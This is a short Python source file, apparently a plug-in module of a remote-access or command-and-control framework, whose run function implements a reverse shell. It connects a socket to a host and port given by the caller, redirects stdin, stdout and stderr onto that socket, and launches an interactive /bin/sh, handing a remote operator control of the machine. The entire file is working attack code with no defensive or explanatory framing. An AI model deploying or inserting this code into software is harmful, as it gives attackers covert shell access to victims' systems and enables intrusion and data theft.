import socket
import subprocess
import os
import json

def run(**args):
    print("[*] In Reverse Shell module.")
    host = args.get("host")
    port = args.get("port")
    
    if not host or not port:
        return json.dumps({"error": "Host and port required for reverse shell."})
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # This will hang the thread until the shell is closed
        p = subprocess.call(["/bin/sh", "-i"])
        return json.dumps({"status": "Shell session closed."})
    except Exception as e:
        return json.dumps({"error": f"Reverse shell failed: {e}"})
